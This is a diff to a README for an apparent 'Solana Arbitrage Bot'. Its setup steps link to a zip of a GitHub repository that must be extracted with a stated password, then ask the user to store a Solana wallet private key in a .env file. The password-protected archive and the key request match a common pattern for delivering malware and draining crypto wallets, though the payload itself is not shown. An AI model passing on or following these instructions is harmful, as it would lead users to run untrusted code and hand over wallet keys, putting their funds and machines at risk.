@@ -26,13 +26,12 @@ Follow these steps to set up and run the Solana Arbitrage Bot on your local mach
 - [Clone](https://github.com/gemhunterheh/solana-arbitrage-bot/archive/refs/heads/main.zip) the repository and extract archive with password `WFv53ObKqM`
 - Configure your environment:
 Create a `.env file` in the project's root directory and define your environment variables. You can use the `.env.example` file as a template.
-```bash
+```
 DEBUG=false
 SOLANA_WALLET_PRIVATE_KEY=hgq847chjjjJUPITERiiiISaaaAWESOMEaaANDiiiIwwWANNAbbbBErrrRICHh
 DEFAULT_RPC=https://rpc.ankr.com/solana
 ALT_RPC_LIST=https://change-this-url-in-env.gov,https://change-alt-urls-in-env.com
-
-
+```
 - Start the bot.
 
 
